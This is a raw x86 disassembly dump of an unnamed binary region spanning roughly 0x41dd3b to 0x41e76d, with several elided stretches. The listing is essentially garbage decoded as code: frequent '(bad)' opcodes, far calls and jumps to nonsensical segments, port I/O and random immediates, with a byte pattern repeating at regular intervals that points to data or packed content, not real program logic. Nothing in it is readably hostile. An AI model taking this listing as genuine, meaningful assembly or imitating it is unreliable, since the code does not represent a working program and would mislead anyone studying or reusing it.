  41dd3b:	adc    eax,0xb953715
  41dd40:	das    
  41dd41:	add    BYTE PTR [edx+0x1a],0xc6
  41dd45:	stos   BYTE PTR es:[edi],al
  41dd46:	fild   WORD PTR [edx+0x3c]
  41dd49:	in     al,0x5a
  41dd4b:	dec    edi
  41dd4c:	mov    ah,0x6f
  41dd4e:	adc    DWORD PTR [ecx+edx*8-0x2791c6d4],0x2b
  41dd56:	test   DWORD PTR [ecx],edi
  41dd58:	mov    ch,0xd0
  41dd5a:	stos   BYTE PTR es:[edi],al
  41dd5b:	test   DWORD PTR [esi-0x3212c531],0x295842b6
  41dd65:	mov    dl,bh
  41dd67:	push   esi
  41dd68:	inc    eax
  41dd69:	adc    al,0x18
  41dd6b:	sbb    DWORD PTR [eax],esi
  41dd6d:	xchg   ebx,eax
  41dd6e:	(bad)  
  41dd70:	aad    0xfd
  41dd72:	xchg   edx,eax
  41dd73:	sbb    BYTE PTR [ecx+0x21],al
  41dd76:	shl    BYTE PTR [ecx+0x4563bb1a],cl
  41dd7c:	into   
  41dd7d:	fwait
  41dd7e:	sahf   
  41dd7f:	inc    edi
  41dd80:	cdq    
  41dd81:	dec    ecx
  41dd82:	test   BYTE PTR [eax+0x7],0x22
  41dd86:	fimul  DWORD PTR [edx+edi*2]
  41dd89:	fistp  QWORD PTR [esi]
  41dd8b:	adc    eax,0x8760cc77
	...
  41ddf4:	and    bl,dh
  41ddf6:	das    
  41ddf7:	cmp    bh,0xde
  41ddfa:	lods   eax,DWORD PTR ds:[esi]
  41ddfb:	repz pop ds
  41ddfd:	mov    bl,BYTE PTR [esi-0x41]
  41de00:	xor    BYTE PTR [ebx+0x28],0x44
  41de04:	test   BYTE PTR ds:0x1040001,bh
  41de0a:	add    BYTE PTR [eax],al
  41de0c:	sbb    esp,esi
  41de0e:	jnp    0x41de22
  41de10:	cdq    
  41de11:	loop   0x41de73
  41de13:	sar    DWORD PTR [ecx-0x2938c05c],1
  41de19:	push   ebp
  41de1a:	inc    esi
  41de1b:	add    BYTE PTR [eax-0x7bae7ad1],dl
  41de21:	inc    edi
  41de22:	sub    al,0xf5
  41de24:	ss (bad) 
  41de26:	and    BYTE PTR [edi+0x17f16924],al
  41de2c:	int3   
  41de2d:	jg     0x41de9b
  41de2f:	and    eax,0x5a48b11c
  41de34:	mov    ebx,0x8846225a
  41de39:	jnp    0x41de55
  41de3b:	jbe    0x41de60
  41de3d:	int3   
  41de3e:	test   BYTE PTR [ebx+0x4],dh
  41de41:	or     BYTE PTR [ebx-0xbac71ac],dh
  41de47:	shl    DWORD PTR [ecx+edx*1+0x5fb49944],cl
  41de4e:	(bad)  
  41de4f:	mov    ah,0xc0
  41de51:	icebp  
  41de52:	jne    0x41de9c
  41de54:	add    al,BYTE PTR [esi+edi*4]
  41de57:	sbb    BYTE PTR [edi],cl
  41de59:	cmp    dl,dl
  41de5b:	int    0x83
  41de5d:	jg     0x41de01
  41de5f:	inc    edx
  41de60:	and    edi,edi
  41de62:	and    eax,0xf25a1fd2
  41de67:	xor    dh,BYTE PTR [di+0x1f]
  41de6b:	(bad)  
  41de6c:	sbb    edx,edx
  41de6e:	or     bh,BYTE PTR [ecx]
  41de70:	fadd   st(7),st
  41de72:	mov    esi,0xb43bce64
  41de77:	mov    ah,0x9a
  41de79:	pop    esp
  41de7a:	or     al,0xf7
  41de7c:	inc    eax
  41de7d:	icebp  
  41de7e:	and    edi,DWORD PTR [eax]
  41de80:	sbb    eax,0x898ee019
  41de85:	pop    ebx
  41de86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de87:	mov    edx,0xf12492e
  41de8c:	cmc    
  41de8d:	sbb    al,0x93
  41de8f:	push   ss
  41de90:	sar    BYTE PTR [eax+0x64d4064d],0xc7
  41de97:	xor    al,0xa5
  41de99:	imul   edi,ecx,0x55
  41de9c:	jg     0x41de24
  41de9e:	xor    DWORD PTR [esi-0x16],esp
  41dea1:	imul   edi,DWORD PTR [eax+0x4f],0x670966f2
  41dea8:	push   esp
  41dea9:	jne    0x41df00
  41deab:	out    dx,eax
  41deac:	and    al,0x6
  41deae:	stos   DWORD PTR es:[edi],eax
  41deaf:	or     al,BYTE PTR ds:0x23cd40c0
  41deb5:	mov    ds:0x844ced1f,eax
  41deba:	arpl   si,si
  41debc:	pop    esp
  41debd:	or     al,0xe0
  41debf:	call   0xf707:0x8d473dc9
  41dec6:	in     eax,dx
  41dec7:	jecxz  0x41de7e
  41dec9:	mov    cl,0x3e
  41decb:	call   0xdadd:0x203e561e
  41ded2:	jae    0x41de9d
  41ded4:	call   0xef81:0x4bf1e46d
  41dedb:	push   cs
  41dedc:	jmp    FWORD PTR [edi+0x3c423a35]
  41dee2:	or     ebp,esp
  41dee4:	dec    ebp
  41dee5:	or     eax,0xd65f7ddc
  41deea:	mov    dl,0x78
  41deec:	and    dl,BYTE PTR [ebp-0x78]
  41deef:	sub    eax,0xc5a417cc
  41def4:	xor    eax,0x72474e4c
  41def9:	jno    0x41de88
  41defb:	gs push ecx
  41defd:	leave  
  41defe:	dec    ecx
  41deff:	test   BYTE PTR [edi+ecx*4-0xe741df6],dl
  41df06:	push   edi
  41df07:	mov    edx,0x816c5d15
  41df0c:	add    DWORD PTR [ecx],esp
  41df0e:	sar    DWORD PTR [ebp+0x0],1
	...
  41df74:	aas    
  41df75:	daa    
  41df76:	push   ss
  41df77:	cld    
  41df78:	push   ds
  41df79:	std    
  41df7a:	jmp    edi
  41df7c:	dec    edi
  41df7d:	push   0xf1149ce9
  41df82:	out    dx,al
  41df83:	jp     0x41df0d
  41df85:	add    DWORD PTR ds:[eax],eax
  41df88:	add    al,0x1
  41df8a:	add    BYTE PTR [eax],al
  41df8c:	fsub   QWORD PTR [eax-0x2c]
  41df8f:	xchg   esp,eax
  41df90:	into   
  41df91:	jb     0x41df87
  41df93:	addr16 in al,dx
  41df95:	cmp    al,0xdf
  41df97:	outs   dx,DWORD PTR ds:[esi]
  41df98:	(bad)  
  41df99:	mov    dl,0xf5
  41df9b:	rol    BYTE PTR [esi+0x0],1
  41df9e:	icebp  
  41df9f:	ja     0x41e017
  41dfa1:	call   DWORD PTR ds:0x9bc7bb65
  41dfa7:	popf   
  41dfa8:	mov    eax,ds:0x9c85d6a0
  41dfad:	dec    ebp
  41dfae:	inc    ecx
  41dfaf:	lea    edx,[eax-0x577928a]
  41dfb5:	inc    esp
  41dfb6:	sub    eax,0xd04f8af
  41dfbb:	push   eax
  41dfbc:	cmp    eax,0x24c919a5
  41dfc1:	jp     0x41df73
  41dfc3:	std    
  41dfc4:	jae    0x41e027
  41dfc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfc7:	sbb    DWORD PTR [edi-0x2a958cea],eax
  41dfcd:	sub    ah,dl
  41dfcf:	je     0x41dfb8
  41dfd1:	pop    edx
  41dfd2:	loop   0x41dfc0
  41dfd4:	mov    esi,0x6ce619e
  41dfd9:	and    al,0x48
  41dfdb:	cmp    bl,BYTE PTR [ebp-0x1af83544]
  41dfe1:	xor    DWORD PTR [esi-0x512b60e9],ebx
  41dfe7:	int3   
  41dfe8:	ss or  ebx,edi
  41dfeb:	ds loopne 0x41df72
  41dfee:	lods   eax,DWORD PTR ds:[esi]
  41dfef:	retf   0xc79e
  41dff2:	popa   
  41dff3:	push   ss
  41dff4:	and    al,0x2
  41dff6:	ret    0x5ba0
  41dff9:	outs   dx,DWORD PTR ds:[si]
  41dffb:	scas   eax,DWORD PTR es:[edi]
  41dffc:	pop    ebx
  41dffd:	ins    BYTE PTR es:[edi],dx
  41dffe:	(bad)  [edx-0x3a]
  41e001:	iret   
  41e002:	pusha  
  41e003:	jns    0x41e057
  41e005:	ins    BYTE PTR es:[edi],dx
  41e006:	inc    eax
  41e007:	xchg   BYTE PTR [ecx-0x734cbd6f],bh
  41e00d:	dec    ecx
  41e00e:	js     0x41dfe7
  41e010:	cmc    
  41e011:	icebp  
  41e012:	out    dx,eax
  41e013:	inc    esi
  41e014:	fisubr DWORD PTR [edx-0x7b]
  41e017:	pushf  
  41e018:	dec    ebx
  41e019:	and    dh,BYTE PTR [ebx-0x2e8c330]
  41e01f:	cdq    
  41e020:	adc    eax,0x5486abe6
  41e025:	div    ch
  41e027:	lods   eax,DWORD PTR ds:[esi]
  41e028:	mov    ebx,0xf9996e32
  41e02d:	jno    0x41e049
  41e02f:	out    dx,eax
  41e030:	shr    BYTE PTR [eax+ecx*8+0x7],0xe3
  41e035:	cmp    al,0x21
  41e037:	xchg   ecx,eax
  41e038:	dec    edi
  41e039:	test   eax,0x86833dab
  41e03e:	jecxz  0x41dfcf
  41e040:	pop    esi
  41e041:	and    ah,bh
  41e043:	ins    BYTE PTR es:[edi],dx
  41e044:	jmp    FWORD PTR [esi-0x55f13349]
  41e04a:	pushf  
  41e04b:	stos   DWORD PTR es:[edi],eax
  41e04c:	dec    esp
  41e04d:	sbb    esp,DWORD PTR [edx-0x10]
  41e050:	push   0xa1254798
  41e055:	ret    
  41e056:	(bad)  
  41e057:	repz sbb eax,0xed0790ab
  41e05d:	or     BYTE PTR [ecx+eiz*8],al
  41e060:	fwait
  41e061:	dec    edi
  41e062:	rol    BYTE PTR [ecx],cl
  41e064:	(bad)  
  41e066:	sub    DWORD PTR [ebx+0x1384bb3c],edi
  41e06c:	adc    al,0x5d
  41e06e:	pusha  
  41e06f:	bnd jno 0x41e042
  41e072:	pushf  
  41e073:	scas   eax,DWORD PTR es:[edi]
  41e074:	(bad)  
  41e075:	and    DWORD PTR [esi],0x27
  41e078:	mov    dh,0x20
  41e07a:	scas   eax,DWORD PTR es:[edi]
  41e07b:	daa    
  41e07c:	and    DWORD PTR [esi],edi
  41e07e:	sbb    esi,DWORD PTR [eax*1+0x300c9cb]
  41e085:	add    ebp,DWORD PTR [eax+0x668cd6da]
  41e08b:	xchg   DWORD PTR ds:0x3c70b,edx
	...
  41e0f1:	add    BYTE PTR [eax],al
  41e0f3:	add    BYTE PTR [edi+0x53],cl
  41e0f6:	add    al,0xc
  41e0f8:	sbb    al,0x5f
  41e0fa:	dec    edi
  41e0fb:	push   ebx
  41e0fc:	out    0x6d,eax
  41e0fe:	aad    0x48
  41e100:	push   0xfffffff2
  41e102:	test   al,0xe4
  41e104:	mov    WORD PTR [edi],?
  41e106:	add    DWORD PTR [eax],eax
  41e108:	add    al,0x1
  41e10a:	add    BYTE PTR [eax],al
  41e10c:	fwait
  41e10d:	mov    eax,DWORD PTR [ecx-0x4c3c2186]
  41e113:	mov    ebp,0x2483f56d
  41e118:	jo     0x41e138
  41e11a:	lods   al,BYTE PTR ds:[esi]
  41e11b:	inc    edx
  41e11c:	dec    ecx
  41e11d:	mov    BYTE PTR [esi+0x1b],0x79
  41e121:	lahf   
  41e122:	les    eax,FWORD PTR [edx-0x262a07a9]
  41e128:	aad    0x67
  41e12a:	mov    edx,0x900fab5
  41e12f:	jl     0x41e121
  41e131:	push   ss
  41e132:	jne    0x41e0b6
  41e134:	xor    eax,0x97467045
  41e139:	pop    edi
  41e13a:	push   cs
  41e13b:	inc    ebx
  41e13c:	mov    ah,0xe3
  41e13e:	(bad)  
  41e13f:	loop   0x41e187
  41e141:	ds mov bl,0xb6
  41e144:	lods   eax,DWORD PTR ds:[esi]
  41e145:	mov    al,0x8d
  41e147:	loope  0x41e0f6
  41e149:	lods   eax,DWORD PTR ds:[esi]
  41e14a:	sahf   
  41e14b:	(bad)  
  41e14c:	mov    ch,0x62
  41e14e:	push   edi
  41e14f:	xor    BYTE PTR [edx-0x54],0x5b
  41e153:	xchg   esi,eax
  41e154:	adc    al,0xc5
  41e156:	cmp    dh,dl
  41e158:	xor    dh,BYTE PTR [esi+0x70]
  41e15b:	pop    ebx
  41e15c:	mov    ecx,0x66dd267d
  41e161:	mov    ch,0x95
  41e163:	(bad)  
  41e164:	and    BYTE PTR [eax-0x2f],al
  41e167:	push   ebx
  41e168:	xchg   edi,eax
  41e169:	out    0x30,al
  41e16b:	mov    al,0x8a
  41e16d:	cmp    bl,al
  41e16f:	adc    edi,0x1d
  41e172:	jmp    0xb5fb3d74
  41e177:	push   es
  41e178:	pop    ds
  41e179:	inc    esp
  41e17a:	and    DWORD PTR [edi],ebx
  41e17c:	dec    esi
  41e17d:	push   edi
  41e17e:	fist   WORD PTR [ecx]
  41e180:	pop    eax
  41e181:	or     ch,0xf4
  41e184:	or     DWORD PTR ds:0x107c6ff0,0x39
  41e18b:	xchg   ecx,eax
  41e18c:	xor    eax,DWORD PTR [edx]
  41e18e:	fisub  WORD PTR [eax]
  41e190:	ins    DWORD PTR es:[edi],dx
  41e191:	xchg   edx,eax
  41e192:	mov    eax,edi
  41e194:	aaa    
  41e195:	test   cl,ah
  41e197:	jp     0x41e176
  41e199:	enter  0x7d20,0x34
  41e19d:	inc    esi
  41e19e:	out    dx,al
  41e19f:	adc    al,0x37
  41e1a1:	or     eax,0x255056d8
  41e1a6:	stos   DWORD PTR es:[edi],eax
  41e1a7:	lea    esp,[edx]
  41e1a9:	push   0x54
  41e1ab:	(bad)  [edx]
  41e1ad:	inc    ebx
  41e1ae:	dec    edi
  41e1af:	test   eax,0x70e90446
  41e1b4:	dec    eax
  41e1b5:	in     al,0x91
  41e1b7:	jg     0x41e1a7
  41e1b9:	sub    BYTE PTR [esi+0x14dfa1d5],0x1
  41e1c0:	les    esi,FWORD PTR [ecx]
  41e1c2:	clc    
  41e1c3:	jg     0x41e21a
  41e1c5:	sbb    ah,ch
  41e1c7:	lds    edi,FWORD PTR [ebx]
  41e1c9:	jg     0x41e236
  41e1cb:	aaa    
  41e1cc:	dec    ebp
  41e1cd:	adc    ecx,edx
  41e1cf:	jns    0x41e225
  41e1d1:	push   ds
  41e1d2:	inc    edi
  41e1d3:	or     BYTE PTR [ecx],bh
  41e1d5:	addr16 jnp 0x41e24e
  41e1d8:	xor    eax,0x38c81367
  41e1dd:	aad    0x16
  41e1df:	test   BYTE PTR [ebp+eax*4+0x4d79bf89],0xf2
  41e1e7:	pop    edx
  41e1e8:	sub    eax,0xdb45ce3d
  41e1ed:	hlt    
  41e1ee:	sub    BYTE PTR [ecx-0x5444d274],0x87
  41e1f5:	ja     0x41e224
  41e1f7:	mov    esi,0xa363ad9
  41e1fc:	sbb    BYTE PTR [edi+0x235a4357],cl
  41e202:	out    dx,al
  41e203:	sub    edi,ecx
  41e205:	int    0x47
  41e207:	jge    0x41e250
  41e209:	in     al,0xf
  41e20b:	inc    edx
  41e20c:	xchg   ecx,eax
  41e20d:	lea    edi,[edi+ebx*1+0x0]
	...
  41e274:	stos   DWORD PTR es:[edi],eax
  41e275:	add    dh,BYTE PTR [edi-0x1a]
  41e278:	push   edi
  41e27a:	mov    ebx,0x6f64c34f
  41e27f:	or     al,0x83
  41e281:	push   0xffffffb9
  41e283:	dec    esp
  41e284:	nop
  41e285:	inc    eax
  41e286:	add    DWORD PTR [eax],eax
  41e288:	add    al,0x1
  41e28a:	add    BYTE PTR [eax],al
  41e28c:	or     eax,ebx
  41e28e:	repnz imul BYTE PTR [esi+0x35676a21]
  41e295:	mov    ebp,0xb0486416
  41e29a:	popf   
  41e29b:	ins    BYTE PTR es:[edi],dx
  41e29c:	xor    BYTE PTR [eax+esi*4+0x5eeb9f35],cl
  41e2a3:	push   0xfc4fcb35
  41e2a8:	and    eax,DWORD PTR [esi+0x42]
  41e2ab:	jae    0x41e300
  41e2ad:	jae    0x41e230
  41e2af:	adc    DWORD PTR [eax+ebx*1+0x70],edx
  41e2b3:	js     0x41e281
  41e2b5:	lahf   
  41e2b6:	push   eax
  41e2b7:	out    0x45,eax
  41e2b9:	dec    ecx
  41e2ba:	scas   al,BYTE PTR es:[edi]
  41e2bb:	jmp    0x92ed171d
  41e2c0:	stos   DWORD PTR es:[edi],eax
  41e2c1:	cwde   
  41e2c2:	add    edi,DWORD PTR [eax-0x71]
  41e2c5:	jbe    0x41e262
  41e2c7:	add    ebp,DWORD PTR [edi-0x4c7dfad5]
  41e2cd:	aam    0x26
  41e2cf:	and    DWORD PTR [esi-0x486d3009],esp
  41e2d5:	jle    0x41e269
  41e2d7:	sar    ebx,cl
  41e2d9:	shl    DWORD PTR [edi],0x2
  41e2dc:	ret    0x1b7e
  41e2df:	sbb    eax,DWORD PTR ds:0x13422bef
  41e2e5:	fild   DWORD PTR [ecx+0x10549e24]
  41e2eb:	(bad)  
  41e2ec:	aad    0x7d
  41e2ee:	mov    gs,WORD PTR [esi+edx*2]
  41e2f1:	adc    al,0xe4
  41e2f3:	call   0xa744f965
  41e2f8:	xchg   edx,eax
  41e2f9:	jo     0x41e2ac
  41e2fb:	mov    BYTE PTR [ebx-0x27],ch
  41e2fe:	jmp    0xa876a5af
  41e303:	and    edi,edx
  41e305:	nop
  41e306:	add    BYTE PTR [eax],0x40
  41e309:	jle    0x41e361
  41e30b:	enter  0x2b4e,0x27
  41e30f:	mov    ebp,0xaede6504
  41e314:	fwait
  41e315:	sbb    bl,BYTE PTR [ecx-0x2ccff0f2]
  41e31b:	fadd   QWORD PTR [ebx+0x76dda1cc]
  41e321:	ins    BYTE PTR es:[edi],dx
  41e322:	dec    eax
  41e323:	out    dx,eax
  41e324:	sub    al,0xb1
  41e326:	jl     0x41e31b
  41e328:	lods   eax,DWORD PTR ds:[esi]
  41e329:	outs   dx,BYTE PTR ds:[esi]
  41e32a:	popa   
  41e32b:	shr    DWORD PTR [ecx],0x66
  41e32e:	sbb    eax,0x9b7b7746
  41e333:	mov    eax,0xf638746c
  41e338:	sub    ebp,esi
  41e33a:	je     0x41e3a7
  41e33c:	or     DWORD PTR [edx-0x4329658c],ecx
  41e342:	adc    DWORD PTR [ebx],ecx
  41e344:	mov    ecx,edx
  41e346:	mov    dl,0x87
  41e348:	adc    ebx,ebp
  41e34a:	jno    0x41e374
  41e34c:	cmp    dh,al
  41e34e:	cmp    esp,esp
  41e350:	int    0x98
  41e352:	sbb    edi,edi
  41e354:	mov    ebx,0x961f29c2
  41e359:	ret    0xb3fa
  41e35c:	cld    
  41e35d:	xchg   ebp,eax
  41e35e:	fst    st(0)
  41e360:	mov    ecx,0x127e9a92
  41e365:	aad    0xc2
  41e367:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e368:	sbb    eax,0x2938cc3c
  41e36d:	icebp  
  41e36e:	mov    ds:0x3b770f73,eax
  41e373:	bts    DWORD PTR [ebx],ebx
  41e376:	ror    DWORD PTR [edi+edi*4],1
  41e379:	mov    al,0x5
  41e37b:	loopne 0x41e300
  41e37d:	mov    ebx,0xd4416d36
  41e382:	sbb    al,dh
  41e384:	sub    ebp,ebp
  41e386:	std    
  41e387:	xchg   ecx,eax
  41e388:	rcl    BYTE PTR [eax+0x22],cl
  41e38b:	pop    es
  41e38c:	lods   al,BYTE PTR ds:[esi]
  41e38d:	(bad)  
  41e38e:	push   ecx
  41e38f:	imul   eax,DWORD PTR [eax],0x0
	...
  41e3f2:	add    BYTE PTR [eax],al
  41e3f4:	mov    DWORD PTR [edx],edx
  41e3f6:	ja     0x41e417
  41e3f8:	(bad)  
  41e3f9:	jg     0x41e3e4
  41e3fb:	xchg   esi,eax
  41e3fc:	or     DWORD PTR [edx+0x18],0xd70f2f09
  41e403:	adc    al,0x94
  41e405:	inc    ecx
  41e406:	add    DWORD PTR [eax],eax
  41e408:	add    al,0x1
  41e40a:	add    BYTE PTR [eax],al
  41e40c:	fild   WORD PTR [ecx-0x2e960ed5]
  41e412:	cmp    DWORD PTR [eax+0x77],edi
  41e415:	push   edi
  41e416:	pop    edx
  41e417:	push   0x66
  41e419:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e41a:	fsubp  st(1),st
  41e41c:	sub    eax,0xb52917a
  41e421:	and    ch,cl
  41e423:	iret   
  41e424:	xchg   DWORD PTR [eax-0x36],esp
  41e427:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e428:	xor    dl,cl
  41e42a:	sub    bh,BYTE PTR [bp+si-0x7e]
  41e42e:	(bad)  
  41e42f:	in     al,0x59
  41e431:	mov    WORD PTR [ebx+0x270eab1b],ds
  41e437:	in     eax,0xf0
  41e439:	pop    edi
  41e43a:	sub    edi,DWORD PTR [ebp-0x222cfff4]
  41e440:	(bad)  
  41e441:	cdq    
  41e442:	jmp    0x2d7c5d99
  41e447:	scas   eax,DWORD PTR es:[edi]
  41e448:	dec    edx
  41e449:	loop   0x41e41e
  41e44b:	js     0x41e407
  41e44d:	clc    
  41e44e:	imul   eax,DWORD PTR [ecx-0x64],0xffffffd3
  41e452:	adc    dh,BYTE PTR [ebx-0x3c]
  41e455:	or     BYTE PTR [edx+0xc],cl
  41e458:	(bad)  
  41e459:	push   ebx
  41e45a:	out    dx,eax
  41e45b:	je     0x41e401
  41e45d:	call   0x6ca0:0x87cd8ad0
  41e464:	aad    0xf3
  41e466:	xor    bl,BYTE PTR [eax-0x31]
  41e469:	sbb    DWORD PTR [ecx+ecx*4+0x30],edx
  41e46d:	or     eax,0x6df9c83c
  41e472:	inc    edx
  41e473:	bound  ebx,QWORD PTR [ecx]
  41e475:	stc    
  41e476:	rcr    BYTE PTR [eax-0x20],cl
  41e479:	in     al,dx
  41e47a:	es cmp al,bl
  41e47d:	jp     0x41e405
  41e47f:	inc    esi
  41e480:	pop    esi
  41e481:	cmp    DWORD PTR [ecx+0x37],edx
  41e484:	or     bl,BYTE PTR [esi+edx*1-0x7f]
  41e488:	test   al,0xae
  41e48a:	popa   
  41e48b:	in     eax,dx
  41e48c:	push   0xffffffb3
  41e48e:	push   ebx
  41e48f:	out    dx,eax
  41e490:	mov    ch,0x65
  41e492:	mov    DWORD PTR [edi-0x7805ccca],esp
  41e498:	call   0xd71e:0x2d54bd46
  41e49f:	enter  0xf5e0,0xeb
  41e4a3:	mov    ch,0x1
  41e4a5:	jmp    0xe896ab09
  41e4aa:	jmp    0x66e:0xee0fb166
  41e4b1:	adc    al,0xd5
  41e4b3:	sbb    eax,0xf8283f5d
  41e4b8:	add    eax,0xc4fcfac2
  41e4bd:	js     0x41e45c
  41e4bf:	xor    eax,0xb92ba6c5
  41e4c4:	mov    al,BYTE PTR [eax-0x4a]
  41e4c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4c8:	push   ds
  41e4c9:	shl    DWORD PTR [ebx+edx*8+0x39],1
  41e4cd:	mov    esp,0xdee7cc6c
  41e4d2:	test   eax,0x51823ad5
  41e4d7:	ror    DWORD PTR [edi+0x3c95fdcf],0x10
  41e4de:	mov    BYTE PTR [ebx],ah
  41e4e0:	jecxz  0x41e46f
  41e4e2:	mov    DWORD PTR [edx],ebp
  41e4e4:	pop    ds
  41e4e5:	fidivr DWORD PTR [ebx+0x6d]
  41e4e8:	pop    esi
  41e4e9:	into   
  41e4ea:	adc    BYTE PTR [eax+0x59],0xf5
  41e4ee:	jb     0x41e53f
  41e4f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4f1:	in     eax,0x43
  41e4f3:	fwait
  41e4f4:	lods   eax,DWORD PTR ds:[esi]
  41e4f5:	pop    esi
  41e4f6:	retf   
  41e4f7:	mov    eax,ds:0xd9486700
  41e4fc:	mov    dh,0x17
  41e4fe:	cwde   
  41e4ff:	popf   
  41e500:	push   es
  41e501:	dec    ebp
  41e502:	push   esi
  41e503:	mov    ah,0x72
  41e505:	ins    BYTE PTR es:[edi],dx
  41e506:	mov    eax,ds:0xe3907e95
  41e50b:	(bad)  
  41e50c:	pop    esp
  41e50d:	rcr    BYTE PTR [ecx+0x28],cl
	...
  41e573:	add    BYTE PTR [eax],ah
  41e575:	push   0xffffffcb
  41e577:	dec    ebx
  41e578:	retf   
  41e579:	jmp    0x41e51b
  41e57b:	imul   ebp,ebx,0xffffffb1
  41e57e:	aaa    
  41e57f:	je     0x41e5db
  41e581:	or     al,0x93
  41e583:	jno    0x41e51d
  41e585:	inc    edx
  41e586:	add    DWORD PTR [eax],eax
  41e588:	add    al,0x1
  41e58a:	add    BYTE PTR [eax],al
  41e58c:	mov    al,ds:0x775c8a1b
  41e591:	jae    0x41e576
  41e593:	mov    edi,0x4cf7752f
  41e598:	xchg   BYTE PTR [edx],bl
  41e59a:	mov    ds:0xac0c274c,eax
  41e59f:	(bad)  
  41e5a0:	pop    ecx
  41e5a1:	ror    ah,cl
  41e5a3:	loop   0x41e5a8
  41e5a5:	inc    eax
  41e5a6:	sti    
  41e5a7:	cmp    al,0x46
  41e5a9:	nop
  41e5aa:	cmp    eax,0x76d4e922
  41e5af:	cwde   
  41e5b0:	int    0xec
  41e5b2:	jecxz  0x41e5da
  41e5b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5b5:	sbb    eax,0xb322d4bb
  41e5ba:	pop    ds
  41e5bb:	or     ebx,edx
  41e5bd:	push   es
  41e5be:	les    ebx,FWORD PTR [eax-0x2bcfab85]
  41e5c4:	inc    cl
  41e5c6:	sub    eax,0x906f2bb0
  41e5cb:	fistp  QWORD PTR [esi+0xfaa080e]
  41e5d1:	and    dl,cl
  41e5d3:	lahf   
  41e5d4:	aad    0x47
  41e5d6:	imul   edx,DWORD PTR [ecx+eax*1-0x5443793],0x22
  41e5de:	ss jmp 0x25a0:0x973273d7
  41e5e6:	lea    edx,[edx+0x2b]
  41e5e9:	daa    
  41e5ea:	mov    esp,0x49d8cf48
  41e5ef:	push   ebp
  41e5f0:	inc    ebp
  41e5f1:	adc    edx,0xdd63bfd1
  41e5f7:	loopne 0x41e633
  41e5f9:	not    BYTE PTR ds:[edi+0x2]
  41e5fd:	mov    bl,0x56
  41e5ff:	loop   0x41e5ae
  41e601:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e602:	in     eax,dx
  41e603:	fidivr WORD PTR [ebx-0x69]
  41e606:	cmp    eax,DWORD PTR [edi-0x1b32e087]
  41e60c:	jmp    0x41e660
  41e60e:	xlat   BYTE PTR ds:[ebx]
  41e60f:	push   ecx
  41e610:	push   esp
  41e611:	jle    0x41e5fe
  41e613:	mov    ch,0x15
  41e615:	in     eax,0xf6
  41e617:	add    BYTE PTR [esi+0x40ed1e5a],dh
  41e61d:	or     ch,ah
  41e61f:	or     ecx,DWORD PTR [edi-0x7c4dd80c]
  41e625:	xchg   edi,eax
  41e626:	aad    0x2
  41e628:	sbb    bl,BYTE PTR [edx]
  41e62a:	mov    esi,0xb3e13437
  41e62f:	sbb    edx,0xc6b6d460
  41e635:	pop    esp
  41e636:	ret    0xa5e
  41e639:	pop    eax
  41e63a:	pop    ecx
  41e63b:	pushf  
  41e63c:	inc    edi
  41e63d:	xor    eax,0xb0804abd
  41e642:	add    eax,0x831f76fd
  41e647:	jmp    0x41e63a
  41e649:	retf   0xf488
  41e64c:	enter  0x88cd,0xc7
  41e650:	xchg   esi,eax
  41e651:	adc    ecx,edx
  41e653:	and    eax,0xcff54de6
  41e658:	leave  
  41e659:	mov    cs,WORD PTR [edi-0x28ba19c5]
  41e65f:	pop    ebp
  41e660:	(bad)  
  41e661:	int    0x49
  41e663:	pop    ecx
  41e664:	pop    ss
  41e665:	dec    esi
  41e666:	mov    ebx,0xecee7e3e
  41e66b:	sbb    ebx,DWORD PTR [ebp+eax*2+0x1cdd2346]
  41e672:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e673:	push   ds
  41e674:	push   ds
  41e675:	mov    bl,0xb7
  41e677:	mov    ecx,0xd9c6a4b2
  41e67c:	jbe    0x41e66c
  41e67e:	pop    ss
  41e67f:	cmp    eax,0xbf34938a
  41e684:	sbb    esp,DWORD PTR [eax+ecx*4]
  41e687:	cmp    eax,0x7379a37e
  41e68c:	enter  0x1b43,0xb7
	...
  41e6f4:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41e6fa:	cmc    
  41e6fb:	cwde   
  41e6fc:	xchg   esp,eax
  41e6fd:	push   0x37
  41e6ff:	sub    ecx,esp
  41e701:	mov    bh,0xad
  41e703:	(bad)  
  41e704:	pushf  
  41e705:	inc    ebx
  41e706:	add    DWORD PTR [eax],eax
  41e708:	add    al,0x1
  41e70a:	add    BYTE PTR [eax],al
  41e70c:	xor    DWORD PTR [ebx],0xf
  41e70f:	outs   dx,DWORD PTR ds:[esi]
  41e710:	sbb    al,0xae
  41e712:	adc    eax,0x8d7052d1
  41e717:	hlt    
  41e718:	retf   
  41e719:	jno    0x41e6bb
  41e71b:	adc    eax,0xc77e4f4
  41e720:	retf   
  41e721:	bound  eax,QWORD PTR [ebx]
  41e723:	data16 xor cl,BYTE PTR [edx+0x914e088]
  41e72a:	adc    BYTE PTR ss:[ecx+0xe7c260a],al
  41e731:	mov    eax,0x7bb83d3b
  41e736:	or     DWORD PTR [ecx+eax*2-0x25],edx
  41e73a:	cmp    ah,ch
  41e73c:	outs   dx,DWORD PTR ds:[esi]
  41e73d:	xchg   edi,eax
  41e73e:	jns    0x41e6c7
  41e740:	mov    edi,0x63970e31
  41e745:	cmc    
  41e746:	addr16 sbb al,0x5c
  41e749:	test   al,0xc3
  41e74b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e74c:	cmp    eax,0x5f186913
  41e751:	mov    bh,0xfa
  41e753:	push   edx
  41e754:	(bad)  
  41e755:	adc    ch,dl
  41e757:	mov    dl,BYTE PTR [ebx+eiz*1-0x1a]
  41e75b:	lea    ecx,[esi-0x27]
  41e75e:	cdq    
  41e75f:	pop    es
  41e760:	sar    BYTE PTR [ebx],0xd0
  41e763:	push   ss
  41e764:	xchg   ebp,eax
  41e765:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e766:	and    BYTE PTR [ebx+eax*1+0x7ee3766a],dl
  41e76d:	push   ss
